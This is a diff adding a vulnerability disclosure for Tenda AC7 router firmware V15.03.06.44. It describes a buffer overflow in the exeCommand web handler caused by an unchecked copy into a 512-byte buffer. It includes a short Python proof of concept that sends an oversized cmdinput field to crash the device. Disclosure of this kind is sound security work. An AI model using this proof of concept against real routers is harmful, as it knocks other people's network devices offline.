@@ -29,3 +29,25 @@ Attacked version
 ----------------
 
 V15.03.06.44
+
+Vulnerability Details
+----------------
+A buffer overflow vulnerability exists in TenDa AC7 V15.03.06.44 firmware feature. This function copies the contents of the string to cmd_buf without performing a boundary check. Therefore, if the length is longer than 512 bytes, it can cause a buffer overflow, overwriting the memory area behind the array, which can cause the program to crash and trigger this security vulnerability.
+
+![image](https://github.com/user-attachments/assets/ba19c8a1-732d-4dac-8258-6344af10f9b2)
+
+### poc
+```text-plain
+import requests
+ip = "192.168.142.100"
+url = "http://" + ip + "/goform/exeCommand"
+payload = b"Raining"*3000
+
+data = {"cmdinput": payload}
+response = requests.post(url, data=data)
+print(response.text)
+```
+![image](https://github.com/user-attachments/assets/ac65ebbf-1756-40d5-82bb-5eb263070f8e)
+
+
+
